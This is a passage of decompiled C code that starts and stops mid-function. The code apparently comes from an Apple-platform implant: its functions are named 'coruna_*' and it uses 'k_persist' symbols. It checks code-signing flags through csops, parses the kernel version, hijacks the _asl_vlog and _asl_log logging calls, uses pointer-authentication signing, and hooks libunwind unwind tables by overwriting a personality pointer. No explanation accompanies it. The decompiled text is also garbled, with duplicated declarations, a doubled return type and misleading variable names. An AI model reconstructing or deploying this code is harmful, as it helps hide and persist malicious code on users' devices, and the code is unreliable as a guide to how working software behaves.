    port = 0;
    u = 0xad014;
  }
  else {
    u = 0;
    port = serial_buf[0][1] & 0xffffff;
  }
  _vm_deallocate(*(vm_map_t *)k_persist_mach_task_self_slot,(vm_address_t)serial_buf[0],
                 (host_info & 0xffffffff) << 2);
  if (*(long *)k_persist_stack_chk_guard_slot == action) {
  return u;
  }
  ___stack_chk_fail();
  if (port < 2) {
done:
    u = 0;
    *buf = 0;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  if (k_persist_rodata_word_1efa0 <= *(double *)k_persist_dyldversionnumber_slot) {
    lp4 = _getpid();
    err = _csops(lp4,0,serial_buf,4);
    if (err < 0) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
      if (*(long *)k_persist_stack_chk_guard_slot == action) {
      return u;
      }
      ___stack_chk_fail();
    }
    if (((uint)serial_buf[0] >> 7 & 1) != 0) goto done;
  }
  scratch = 0;
  lp4 = _getpid();
  err = _csops(lp4,10,&scratch,8);
  if (err != -1) {
    u = 0;
    *buf = 0;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  err = ___error();
  if (*err != 0x22) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  port = scratch;
  u = (scratch & 0xff00ff00) >> 8 | (scratch & 0xff00ff) << 8;
  version = (unsigned long)(u >> 0x10 | u << 0x10);
  ptr = _malloc(version);
  if (ptr == (uint *)0x0) {
    u = 0xad009;
    if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
    }
    ___stack_chk_fail();
  }
  lp4 = _getpid();
  err = _csops(lp4,10,ptr,version);
  if (err == 0) {
    u = 0xad001;
    if (port != 0) {
      port = (*ptr & 0xff00ff00) >> 8 | (*ptr & 0xff00ff) << 8;
      port = port >> 0x10 | port << 0x10;
      if (port == 0xfade0c02) {
        u = (ptr[2] & 0xff00ff00) >> 8 | (ptr[2] & 0xff00ff) << 8;
        u = u >> 0x10 | u << 0x10;
        buf = ptr;
cleanup:
        if (0x80 < u >> 10) {
          size = *(unsigned long *)(buf + 0x14) >> 0x38;
          goto check_ok;
        }
        u = 0xad008;
      }
      else if (port == 0xfade0cc0) {
        port = ptr[2];
        if (port != 0) {
          port = (port & 0xff00ff00) >> 8 | (port & 0xff00ff) << 8;
          port = port >> 0x10 | port << 0x10;
          if (port < 2) {
            port = 1;
          }
          size = (unsigned long)port;
          buf = ptr + 4;
          do {
            port = (buf[-1] & 0xff00ff00) >> 8 | (buf[-1] & 0xff00ff) << 8;
            port = port >> 0x10 | port << 0x10;
            if (port - 0x1000 < 5 || port == 0) {
              port = (*buf & 0xff00ff00) >> 8 | (*buf & 0xff00ff) << 8;
              buf = (uint *)((long)ptr + (unsigned long)(port >> 0x10 | port << 0x10));
              if (*buf != 0x20cdefa) goto skip;
              _bzero(ptr,version);
              _free(ptr);
              u = (buf[2] & 0xff00ff00) >> 8 | (buf[2] & 0xff00ff) << 8;
              u = u >> 0x10 | u << 0x10;
              goto cleanup;
            }
            buf = buf + 2;
            size = size - 1;
          } while (size != 0);
        }
        size = 0;
check_ok:
        lm2 = _mach_host_self();
        lk6 = _host_kernel_version(lm2,(char *)serial_buf);
        if (lk6 == 0) {
retry:
          ptr = _strstr((char *)serial_buf,"xnu-");
          if (ptr != (char *)0x0) {
            thread_attr = 0;
            bootargs = 0;
            err = _sscanf(ptr,"xnu-%u.%u.%u%*s");
            if (err == 3) {
              if (((uint)size >> 4 & 1) == 0) {
                err = ((size & 0x40) == 0 || (natural_t)bootargs != 0x1327) ||
                         0xdd < bootargs;
              }
              else {
                err = false;
              }
              *buf = err;
              u = 0;
              _bzero(ptr,version);
              _free(ptr);
            }
          }
        }
        else if (lk6 == 0x35) {
          host_info = k_persist_rodata_word_1efa8;
          bootargs = 0x200;
          err = _sysctl((int *)&host_info,2,serial_buf,&bootargs,(void *)0x0,0);
          if (err == 0) goto retry;
        }
        u = 0xad00b;
      }
      else {
skip:
        u = 0xad014;
      }
    }
  }
  else {
    err = ___error();
    err = *err;
    buf = (uint *)___error();
    u = -*buf;
    if (-1 < err) {
      u = *buf;
    }
    u = u | 0x40000000;
  }
next:
  _bzero(ptr,version);
  _free(ptr);
fail:
  if (*(long *)k_persist_stack_chk_guard_slot == action) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t
uint64_t coruna_asl_vlog(uint64_t val,uint64_t id_2,int flags,char *path,va_list arg)
{
  int err;
  uint64_t u;
  char *scratch;
  uint64_t bootargs;
  char thread_attr;
  uint32_t scratch;
  long host_info;
  
  host_info = *(long *)k_persist_stack_chk_guard_slot;
  scratch = (char *)0x0;
  err = _vasprintf(&scratch,path,arg);
  if (err == -1 || scratch == (char *)0x0) {
    u = 0xffffffff;
  }
  else {
    if (k_persist_rodata_word_24018 == '\0' || (k_persist_rodata_word_2401a & 1) == 0) {
      u = 0xffffffff;
    }
    else {
      bootargs = (uint64_t)0;
      _cStack_31 = coruna_cat(0x737d,SUB81(0,7));
      err = (uint)(flags == 7) << 1;
      if (flags == 6) {
        err = 1;
      }
      (*k_persist_rodata_word_24028)(k_persist_rodata_word_24020,k_persist_rodata_word_24030,err,&bootargs);
      u = 0;
    }
    _free(scratch);
  }
  if (*(long *)k_persist_stack_chk_guard_slot == host_info) {
    return u;
  }
  ___stack_chk_fail();
}





uint64_t coruna_match_asl_sym(char *path,uint64_t *val)
{
  int err;
  uint64_t u;
  void (*ptr)(void);
  
  if (path == (char *)0x0) {
    return 0;
  }
  if (val == (uint64_t *)0x0) {
    return 0;
  }
  if (k_persist_rodata_word_24018 == '\0' || (k_persist_rodata_word_2401a & 1) == 0) {
fail:
    u = 0;
  }
  else {
    err = _strcmp(path,"_asl_vlog");
    ptr = coruna_asl_vlog;
    if (err != 0) {
      err = _strcmp(path,"_asl_log");
      ptr = coruna_asl_log;
      if (err != 0) goto fail;
    }
    *val = ptr;
    u = 1;
  }
  return u;
}





void coruna_asl_log(void)
{
  coruna_asl_vlog();
  return;
}





bool coruna_init_os_log(void)
{
  char err;
  int err;
  long handle;
  long addr;
  long off;
  uint64_t scratch;
  long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_persist_rodata_word_24038);
  if (err != 0) {
    return false;
  }
  err = k_persist_rodata_word_24019;
  _pthread_mutex_unlock((pthread_mutex_t *)&k_persist_rodata_word_24038);
  return err != '\0';
}





uint64_t coruna_identity(uint64_t val)
{
  return val;
}





uint64_t coruna_identity_80bc(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_return_zero();
  if (err == 0) {
    return val;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_pacia(val,id_2);
  return u;
}





uint64_t coruna_strnlen_wire(long handle)
{
  uint64_t u;
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else if ((*(ushort *)(handle + 0x1c0) & 0x18) == 0) {
    u = 0;
  }
  else {
    scratch = k_persist_nsconcretestackblock_slot;
    bootargs = k_persist_rodata_word_1f020;
    thread_attr = coruna_macho_unwind_info;
    host_info = &k_persist_rodata_word_20c60;
    serial_buf = handle;
    u = coruna_macho_foreach_loadcmd(handle,0x19,&scratch);
  }
  return u;
}





uint64_t coruna_macho_unwind_info(long handle,long addr_2)
{
  char *ptr;
  long *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  char *buf;
  long addr;
  void *scratch;
  long bootargs;
  void *thread_attr;
  uint64_t host_info;
  
  ptr = (char *)(addr_2 + 0x48);
  buf = ptr + (unsigned long)*(uint *)(addr_2 + 0x40) * 0x50;
  do {
    if (buf <= ptr) {
      return 0;
    }
    err = _strncmp(ptr,"__eh_frame",0xb);
    if (err == 0) {
      u = coruna_vec_push_pair(*(long *)(handle + 0x20) + 0xe8,*(long *)(handle + 0x20) + 0xf0);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(handle + 0x20);
      if (*(long *)(handle + 0xe8) == 0) {
        return 0xad001;
      }
      size = *(unsigned long *)(ptr + 0x28);
      if (4 < size >> 0x15) {
        return 0xad014;
      }
      ptr = (long *)(*(long *)(handle + 0xe8) + (unsigned long)(*(int *)(handle + 0xf0) - 1) * 0x10);
      *ptr = *(long *)(ptr + 0x20) + *(long *)(handle + 0x18);
      *(int *)(ptr + 1) = (int)size;
      *(uint8_t *)((long)ptr + 0xc) = 0;
      handle = *(long *)(handle + 0x20);
fail:
      *(uint8_t *)(handle + 0xfd) = 1;
    }
    else {
      err = _strncmp(ptr,"__unwind_info",0xe);
      if (err == 0) {
        addr = *(long *)(handle + 0x20);
        host_info = 0;
        scratch = (void *)0x0;
        handle = *(long *)(ptr + 0x20) + *(long *)(addr + 0x18);
        u = coruna_bind_foreach(handle,coruna_reallocf,&scratch);
        if ((int)u != 0) {
          return u;
        }
        thread_attr = scratch;
        bootargs = addr;
        u = coruna_bind_foreach(handle,coruna_bzero_3,&bootargs);
        _free(scratch);
        if ((int)u != 0) {
          return u;
        }
        handle = *(long *)(handle + 0x20);
        if (*(int *)(handle + 0xf0) != 0) goto fail;
      }
    }
    ptr = ptr + 0x50;
  } while( true );
}





uint64_t coruna_vec_push_pair(uint64_t *val,uint *size)
{
  uint64_t *ptr;
  uint u;
  void *ptr;
  uint64_t size;
  
  size = 0xad001;
  if ((size != (uint *)0x0) && (val != (uint64_t *)0x0)) {
    u = *size;
    ptr = _realloc((void *)*val,(unsigned long)(u + 1) << 4);
    if (ptr == (void *)0x0) {
      size = 0xad009;
    }
    else {
      size = 0;
      ptr = (uint64_t *)((long)ptr + (unsigned long)*size * 0x10);
      *ptr = 0;
      ptr[1] = 0;
      *val = ptr;
      *size = u + 1;
    }
  }
  return size;
}
unsigned long coruna_strnlen(long *arg)

{
  int *fde;
  long *entry_13;
  uint size;
  uint version;
  uint type_id;
  int i;
  uint tag;
  uint64_t kind;
  uint8_t type_id_8;
  uint type_id_12;
  uint type_id_14;
  long serial_9;
  unsigned long type_id_9;
  size_t ls13;
  byte *entry_9;
  byte *entry_14;
  void *entry_15;
  void *entry_16;
  int n;
  long serial_10;
  long *entry_17;
  unsigned long type_id_16;
  uint64_t *entry;
  long serial_11;
  long serial_12;
  unsigned long type_id_17;
  long serial_13;
  byte *entry_18;
  uint *entry_9;
  unsigned long type_id_18;
  unsigned long type_id_19;
  long serial_14;
  char *entry_9;
  long *entry_19;
  byte *entry_20;
  byte *entry_21;
  int *i;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache_36;
  uint64_t sa_saved;
  uint64_t cache_37;
  long path_buf;
  uint64_t tmp_buf;
  char *cache_99;
  uint64_t cache_38;
  uint64_t cache_39;
  unsigned long json_buf [2];
  uint64_t cache_40;
  uint64_t *cache;
  uint64_t cache_101;
  long cache_80;
  uint32_t cache_103;
  uint cache_82;
  uint cache_104;
  uint64_t host_info[2];
  
  if (arg == (long *)0x0) {
    type_id_9 = 0xad001;
  }
  else if (*(char *)((long)arg + 0xfd) == '\0') {
    type_id_9 = 0;
  }
  else {
    serial_9 = *arg;
    if ((*(int *)(serial_9 + 0x118) != 1) ||
       (type_id_9 = coruna_hook_libunwind_bss(serial_9,*(uint64_t *)(serial_9 + 0x110),serial_9 + 0x120),
       (int)type_id_9 == 0)) {
      serial_9 = k_persist_rodata_word_1f038;
      serial_10 = arg[0x1d];
      type_id_9 = 0xad00f;
      if ((serial_10 != 0) && ((int)arg[0x1e] != 0)) {
        type_id_9 = 0;
        type_id_19 = 0;
        do {
          type_id_12 = 0xad00f;
          if ((serial_10 != 0) && (serial_12 = *(long *)(serial_10 + type_id_9 * 0x10), serial_12 != 0)) {
            type_id = *(uint *)(serial_10 + type_id_9 * 0x10 + 8);
            if (type_id == 0) {
              type_id_12 = 0xad00f;
            }
            else {
              type_id_17 = 0;
              do {
                while( true ) {
                  fde = (int *)(serial_12 + type_id_17);
                  i = *fde;
                  if (fde[1] != 0) break;
                  type_id_12 = (int)type_id_17 + i + 4;
                  type_id_17 = (unsigned long)type_id_12;
                  if (type_id <= type_id_12) goto load_ok_28;
                }
                cache_80 = 0;
                cache_40 = 0;
                json_buf[1] = 0;
                cache_101 = 0;
                cache = (uint64_t *)0x0;
                cache_38 = 0;
                json_buf[0] = 0;
                cache_39 = 0;
                cache_37 = 0;
                sa_saved = 0;
                path_buf = 0;
                cache_34 = 0;
                cache_36 = 0;
                cache_35 = 0;
                do {
                if (fde == (int *)0x0) {
                  type_id_12 = 0xad001;
                  break;
                }
                type_id_14 = *fde + 4;
                cache_103 = 0;
                cache_82 = 8;
                i = (int *)((long)(fde + 1) - (unsigned long)(uint)fde[1]);
                type_id_12 = *i + 4;
                if (i[1] != 0) {
                  type_id_12 = 0xad014;
                  break;
                }
                tmp_buf = (unsigned long)coruna_u64_pack14((*(byte *)(i + 2)), (type_id_12));
                if ((*(byte *)(i + 2) | 2) != 3) {
                  type_id_12 = 0xad008;
                  break;
                }
                cache_99 = (char *)((long)i + 9);
                ls13 = _strnlen(cache_99,5);
                if (*(char *)((long)i + (unsigned long)((int)ls13 + 9)) != '\0') {
                  type_id_12 = 0xad014;
                  break;
                }
                cache_104 = (int)ls13 + 10;
                host_info[0] = 0;
                if ((i == (int *)0x0) || (type_id_12 <= cache_104)) {
                  type_id_12 = 0xad001;
                  break;
                }
                type_id_12 = coruna_read_uleb128(&cache_38,host_info,i,&cache_104,type_id_12);
                if ((type_id_12 != 0) ||
                   (type_id_12 = coruna_sign_extend_uleb(&cache_39,i,&cache_104,tmp_buf & 0xffffffff),
                   type_id_12 != 0)) break;
                if (tmp_buf == '\x03') {
                  host_info[0] = 0;
                  if ((uint)tmp_buf <= cache_104) {
                    type_id_12 = 0xad001;
                    break;
                  }
                  type_id_12 = coruna_read_uleb128(json_buf,host_info,i,&cache_104);
                  if (type_id_12 != 0) break;
                }
                else {
                  if (tmp_buf != '\x01') {
                    type_id_12 = 0xad014;
                    break;
                  }
                  json_buf[0] = (unsigned long)*(byte *)((long)i + (unsigned long)cache_104);
                  cache_104 = cache_104 + 1;
                }
                entry_9 = cache_99;
                if (*cache_99 == 'z') {
                  host_info[0] = 0;
                  if ((uint)tmp_buf <= cache_104) {
                    type_id_12 = 0xad001;
                    break;
                  }
                  type_id_12 = coruna_read_uleb128(json_buf + 1,host_info,i,&cache_104);
                  if (type_id_12 != 0) break;
                  entry_9 = entry_9 + 1;
                }
                cache_40 = -1;
                cache_101 = coruna_cat(cache_101,0xffff);
                while( true ) {
                  kind = cache_101;
                  n = (int)*entry_9;
                  if (n == 0) break;
                  type_id_12 = 0xad008;
                  if (7 < n - 0x4cU) break;
                  switch(n) {
                  default:
                    cache_101 = coruna_u64_pack71((cache_101), (*(uint8_t *))((long)i + (unsigned long)cache_104));
                    type_id_12 = 0;
                    cache_104 = cache_104 + 1;
                    break;
                  case 0x4d:
                  case 0x4e:
                  case 0x4f:
                  case 0x51:
                    break;
                  case 0x50:
                    cache_40 = *(char *)((long)i + (unsigned long)cache_104);
                    cache_104 = cache_104 + 1;
                    type_id_12 = coruna_msu_mnt1_path(&cache,(char)cache_40,i,&cache_104,
                                         tmp_buf & 0xffffffff,0);
                    break;
                  case 0x52:
                    cache_101 =
                         coruna_cat(*(uint8_t *)((long)i + (unsigned long)cache_104),
                                  (uint8_t)cache_101);
load_ok_33:
                    type_id_12 = 0;
                    cache_104 = cache_104 + 1;
                    break;
                  case 0x53:
                    type_id_12 = 0;
                    cache_101 = coruna_cat(1,(uint16_t)cache_101);
                  }
                  entry_9 = entry_9 + 1;
                  if (type_id_12 != 0) break;
                }
                if (type_id_12 != 0) break;
                cache_101 = coruna_u64_pack(((uint)tmp_buf - cache_104), ((uint32_t))cache_101);
                type_id_16 = cache_101;
                cache_80 = (long)i + (unsigned long)cache_104;
                cache_101 = SUB81(kind,1);
                type_id_8 = cache_101;
                cache_101 = type_id_16;
                type_id_12 = coruna_msu_mnt1_path(&cache_34,type_id_8,fde,&cache_82,type_id_14,0);
                if (type_id_12 != 0) break;
                type_id_12 = coruna_msu_mnt1_path(&cache_35,cache_101,fde,&cache_82,type_id_14,1);
                if (type_id_12 != 0) break;
                if (*cache_99 == 'z') {
                  host_info[0] = 0;
                  if (type_id_14 <= cache_82) {
                    type_id_12 = 0xad001;
                    break;
                  }
                  type_id_12 = coruna_read_uleb128(&cache_36,host_info,fde,&cache_82);
                  if (type_id_12 != 0) break;
                }
                type_id_12 = coruna_msu_mnt1_path(&sa_saved,cache_101 & 0xff,fde,&cache_82,type_id_14,0);
                if (type_id_12 != 0) break;
                cache_37 = coruna_u64_pack((cache_37), (type_id_14 - cache_82));
                path_buf = (long)fde + (unsigned long)cache_82;
                if (cache != (uint64_t *)0x0) {
                  if (sa_saved == 0) {
                    type_id_12 = 0xad008;
                    break;
                  }
                  type_id_14 = _pthread_mutex_lock((pthread_mutex_t *)&k_persist_rodata_word_24078);
                  if (type_id_14 == 0) {
                    if (k_persist_rodata_word_24590 != (byte *)0x0) {
                      n = (uint)sa_saved * 0x1000000 + -0x61c88647 +
                               (uint)sa_saved * 0x10000 + (uint)sa_saved * 0x100 +
                               (uint)sa_saved;
                      type_id_12 = (((uint)sa_saved * 0x1000000 + -0x60b6453e) - n) +
                              (uint)sa_saved * 0x10000 + (uint)sa_saved * 0x100 +
                              (uint)(byte)sa_saved ^ 0x7f76d;
                      type_id_14 = (n + 0x1124109) - type_id_12 ^ type_id_12 << 8;
                      version = 0xfeedbef7 - (type_id_12 + type_id_14) ^ type_id_14 >> 0xd;
                      type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 0xc;
                      type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 0x10;
                      version = version - (type_id_12 + type_id_14) ^ type_id_14 >> 5;
                      type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 3;
                      type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 10;
                      type_id_12 = version - (type_id_12 + type_id_14) ^ type_id_14 >> 0xf;
                      entry_17 = *(long **)(k_persist_rodata_word_24590 + 0x18);
                      serial_10 = *(long *)(*entry_17 + (unsigned long)((int)entry_17[1] - 1U & type_id_12) * 0x10);
                      if (serial_10 != 0) {
                        do {
                          serial_10 = serial_10 - entry_17[4];
                          if (((*(uint *)(serial_10 + 0x4c) == type_id_12) && (*(int *)(serial_10 + 0x48) == 8)
                              ) && (**(long **)(serial_10 + 0x40) == sa_saved)) {
                            if (cache == *(uint64_t **)(serial_10 + 0x10)) goto load_ok_34;
                            type_id_12 = 0xad008;
                            goto load_ok_35;
                          }
                          serial_10 = *(long *)(serial_10 + 0x38);
                        } while (serial_10 != 0);
                      }
                    }
                    if ((char)cache_40 < '\0') {
                      entry_9 = _calloc(1,0x50);
                      entry = cache;
                      if (entry_9 == (byte *)0x0) {
                        type_id_12 = 0xad009;
                      }
                      else {
                        serial_10 = arg[0x20];
                        *(long *)entry_9 = sa_saved;
                        *(long *)(entry_9 + 8) = serial_10;
                        *(uint64_t **)(entry_9 + 0x10) = cache;
                        if (k_persist_rodata_word_24598 != (byte *)0x0) {
                          type_id_12 = (uint)((unsigned long)cache >> 0x20);
                          n = (type_id_12 & 0xff000000) + 0x9e3779b9 + (type_id_12 & 0xff0000) +
                                   (type_id_12 & 0xff00) + (type_id_12 & 0xff);
                          type_id_12 = (uint)cache;
                          type_id_12 = ((type_id_12 & 0xff000000) + 0x9f49bac2 + (type_id_12 & 0xff0000) +
                                   (type_id_12 & 0xff00) + (type_id_12 & 0xff)) - n ^ 0x7f76d;
                          type_id_14 = (n + 0x1124109) - type_id_12 ^ type_id_12 << 8;
                          version = 0xfeedbef7 - (type_id_12 + type_id_14) ^ type_id_14 >> 0xd;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 0xc;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 0x10;
                          version = version - (type_id_12 + type_id_14) ^ type_id_14 >> 5;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 3;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 10;
                          type_id_12 = version - (type_id_12 + type_id_14) ^ type_id_14 >> 0xf;
                          entry_17 = *(long **)(k_persist_rodata_word_24598 + 0x10);
                          serial_10 = *(long *)(*entry_17 + (unsigned long)((int)entry_17[1] - 1U & type_id_12) * 0x10
                                            );
                          if (serial_10 != 0) {
                            do {
                              serial_10 = serial_10 - entry_17[4];
                              if (((*(uint *)(serial_10 + 0x44) == type_id_12) &&
                                  (*(int *)(serial_10 + 0x40) == 8)) &&
                                 (**(long **)(serial_10 + 0x38) == *(long *)(entry_9 + 0x10)))
                              goto load_ok_36;
                              serial_10 = *(long *)(serial_10 + 0x30);
                            } while (serial_10 != 0);
                          }
                        }
                        entry_14 = _calloc(1,0x48);
                        if (entry_14 != (byte *)0x0) {
                          *(uint64_t **)entry_14 = entry;
                          *(uint64_t *)(entry_14 + 8) = *entry;
                          *entry = coruna_libunwind_lsda_lookup;
                          n = (uint)entry_14[7] * 0x1000000 + -0x61c88647 +
                                   (uint)entry_14[6] * 0x10000 + (uint)entry_14[5] * 0x100 +
                                   (uint)entry_14[4];
                          type_id_12 = (((uint)entry_14[3] * 0x1000000 + -0x60b6453e) - n) +
                                  (uint)entry_14[2] * 0x10000 + (uint)entry_14[1] * 0x100 +
                                  (uint)*entry_14 ^ 0x7f76d;
                          type_id_14 = (n + 0x1124109) - type_id_12 ^ type_id_12 << 8;
                          version = 0xfeedbef7 - (type_id_12 + type_id_14) ^ type_id_14 >> 0xd;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 0xc;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 0x10;
                          version = version - (type_id_12 + type_id_14) ^ type_id_14 >> 5;
                          type_id_12 = type_id_12 - (type_id_14 + version) ^ version >> 3;
                          type_id_14 = type_id_14 - (version + type_id_12) ^ type_id_12 << 10;
                          type_id_12 = version - (type_id_12 + type_id_14) ^ type_id_14 >> 0xf;
                          entry_18 = entry_14 + 0x10;
                          *(byte **)(entry_14 + 0x38) = entry_14;
                          entry_14[0x40] = 8;
                          entry_14[0x41] = 0;
                          entry_14[0x42] = 0;
                          entry_14[0x43] = 0;
                          *(uint *)(entry_14 + 0x44) = type_id_12;
                          entry_21 = k_persist_rodata_word_24598;
                          if (k_persist_rodata_word_24598 == (byte *)0x0) {
                            entry_17 = _calloc(1,0x40);
                            entry_14[0x18] = 0;
                            entry_14[0x19] = 0;
                            entry_14[0x1a] = 0;
                            entry_14[0x1b] = 0;
                            entry_14[0x1c] = 0;
                            entry_14[0x1d] = 0;
                            entry_14[0x1e] = 0;
                            entry_14[0x1f] = 0;
                            entry_14[0x20] = 0;
                            entry_14[0x21] = 0;
                            entry_14[0x22] = 0;
                            entry_14[0x23] = 0;
                            entry_14[0x24] = 0;
                            entry_14[0x25] = 0;
                            entry_14[0x26] = 0;
                            entry_14[0x27] = 0;
                            *(long **)(entry_14 + 0x10) = entry_17;
                            if (entry_17 != (long *)0x0) {
                              entry_17[1] = serial_9;
                              entry_17[3] = (long)entry_18;
                              entry_17[4] = 0x10;
                              entry_15 = _calloc(1,0x200);
                              *entry_17 = (long)entry_15;
                              *(uint32_t *)(entry_17 + 7) = 0xa0111fe1;
                              if (entry_15 != (void *)0x0) {
                                serial_13 = 0;
                                n = 0x20;
                                serial_10 = 0x10;
                                entry_21 = entry_14;
                                entry_19 = entry_17;
                                k_persist_rodata_word_24598 = entry_14;
                                goto load_ok_37;
                              }
                              _free(entry_17);
                            }
                            entry_18[0] = 0;
                            entry_18[1] = 0;
                            entry_18[2] = 0;
                            entry_18[3] = 0;
                            entry_18[4] = 0;
                            entry_18[5] = 0;
                            entry_18[6] = 0;
                            entry_18[7] = 0;
                          }
                          else {
                            entry_19 = *(long **)(k_persist_rodata_word_24598 + 0x10);
                            *(long **)(entry_14 + 0x10) = entry_19;
                            entry_14[0x20] = 0;
                            entry_14[0x21] = 0;
                            entry_14[0x22] = 0;
                            entry_14[0x23] = 0;
                            entry_14[0x24] = 0;
                            entry_14[0x25] = 0;
                            entry_14[0x26] = 0;
                            entry_14[0x27] = 0;
                            entry_17 = *(long **)(entry_21 + 0x10);
                            serial_11 = entry_17[3];
                            serial_10 = entry_17[4];
                            serial_13 = serial_11 - serial_10;
                            *(long *)(entry_14 + 0x18) = serial_13;
                            *(byte **)(serial_11 + 0x10) = entry_14;
                            entry_17[3] = (long)entry_18;
                            n = (int)entry_17[1];
load_ok_37:
                            *(int *)(entry_17 + 2) = (int)entry_17[2] + 1;
                            type_id_16 = (unsigned long)(n - 1U & type_id_12);
                            serial_11 = *entry_17;
                            entry_13 = (long *)(serial_11 + type_id_16 * 0x10);
                            entry_9 = (uint *)(entry_13 + 1);
                            type_id_14 = *entry_9 + 1;
                            *entry_9 = type_id_14;
                            serial_14 = *entry_13;
                            entry_20 = entry_14 + 0x28;
                            entry_20[0] = 0;
                            entry_20[1] = 0;
                            entry_20[2] = 0;
                            entry_20[3] = 0;
                            entry_20[4] = 0;
                            entry_20[5] = 0;
                            entry_20[6] = 0;
                            entry_20[7] = 0;
                            *(long *)(entry_14 + 0x30) = serial_14;
                            if (serial_14 != 0) {
                              *(byte **)(serial_14 + 0x18) = entry_18;
                            }
                            *entry_13 = (long)entry_18;
                            if ((*(int *)(serial_11 + type_id_16 * 0x10 + 0xc) * 10 + 10U <= type_id_14) &&
                               (*(int *)((long)entry_19 + 0x34) == 0)) {
                              version = *(uint *)(entry_19 + 1);
                              entry_15 = _malloc((unsigned long)version << 5);
                              if (entry_15 == (void *)0x0) {
                                *entry_13 = serial_14;
                                serial_11 = *(long *)entry_20;
                                if (serial_11 != 0) {
                                  *(long *)(serial_11 + 0x20) = serial_14;
                                  serial_14 = *(long *)(entry_14 + 0x30);
                                }
                                if (serial_14 != 0) {
                                  *(long *)(serial_14 + 0x18) = serial_11;
                                }
                                *entry_9 = type_id_14;
                                entry_20[0] = 0;
                                entry_20[1] = 0;
                                entry_20[2] = 0;
                                entry_20[3] = 0;
                                entry_20[4] = 0;
                                entry_20[5] = 0;
                                entry_20[6] = 0;
                                entry_20[7] = 0;
                                entry_14[0x30] = 0;
                                entry_14[0x31] = 0;
                                entry_14[0x32] = 0;
                                entry_14[0x33] = 0;
                                entry_14[0x34] = 0;
                                entry_14[0x35] = 0;
                                entry_14[0x36] = 0;
                                entry_14[0x37] = 0;
                                if (serial_13 == 0) {
                                  entry_14 = *(byte **)(entry_14 + 0x20);
                                  if (entry_14 != (byte *)0x0) {
                                    entry_17[3] = serial_10;
                                    entry_17 = *(long **)(entry_14 + 0x10);
                                    k_persist_rodata_word_24598 = entry_14;
                                    goto load_ok_38;
                                  }
                                  _free((void *)**(uint64_t **)(entry_21 + 0x10));
                                  _free(*(void **)(entry_21 + 0x10));
                                  k_persist_rodata_word_24598 = (byte *)0x0;
                                }
                                else {
                                  entry_17[3] = serial_13 + serial_10;
                                  *(uint64_t *)(serial_13 + serial_10 + 0x10) =
                                       *(uint64_t *)(entry_14 + 0x20);
                                  entry_14 = *(byte **)(entry_14 + 0x20);
                                  entry_17 = *(long **)(entry_21 + 0x10);
                                  if (entry_14 != (byte *)0x0) {
load_ok_38:
                                    *(long *)(entry_14 + entry_17[4] + 8) = serial_13;
                                  }
                                  entry = (uint64_t *)
                                            (*entry_17 + (unsigned long)((int)entry_17[1] - 1U & type_id_12) * 0x10
                                            );
                                  *(int *)(entry + 1) = *(int *)(entry + 1) + -1;
                                  if ((byte *)*entry == entry_18) {
                                    *entry = 0;
                                  }
                                  *(int *)(entry_17 + 2) = (int)entry_17[2] + -1;
                                }
                                entry_18[0] = 0;
                                entry_18[1] = 0;
                                entry_18[2] = 0;
                                entry_18[3] = 0;
                                entry_18[4] = 0;
                                entry_18[5] = 0;
                                entry_18[6] = 0;
                                entry_18[7] = 0;
                              }
                              else {
                                _bzero(entry_15,(unsigned long)version << 5);
                                entry_17 = *(long **)entry_18;
                                type_id_14 = *(uint *)(entry_17 + 1);
                                type_id_12 = *(uint *)(entry_17 + 2) >>
                                        (unsigned long)(*(int *)((long)entry_17 + 0xc) + 1U & 0x1f);
                                version = type_id_14 * 2 - 1;
                                if ((version & *(uint *)(entry_17 + 2)) != 0) {
                                  type_id_12 = type_id_12 + 1;
                                }
                                *(uint *)(entry_17 + 5) = type_id_12;
                                *(uint32_t *)((long)entry_17 + 0x2c) = 0;
                                if (type_id_14 == 0) {
                                  entry_16 = (void *)*entry_17;
                                }
                                else {
                                  n = 0;
                                  type_id_16 = 0;
                                  entry_16 = (void *)*entry_17;
                                  do {
                                    serial_10 = *(long *)((long)entry_16 + type_id_16 * 0x10);
                                    while (serial_10 != 0) {
                                      serial_13 = *(long *)(serial_10 + 0x20);
                                      type_id_18 = (unsigned long)(*(uint *)(serial_10 + 0x34) & version);
                                      size = *(int *)((long)entry_15 + type_id_18 * 0x10 + 8) + 1;
                                      *(uint *)((long)entry_15 + type_id_18 * 0x10 + 8) = size;
                                      if (type_id_12 < size) {
                                        n = n + 1;
                                        *(int *)((long)entry_17 + 0x2c) = n;
                                        tag = 0;
                                        if (type_id_12 != 0) {
                                          tag = size / type_id_12;
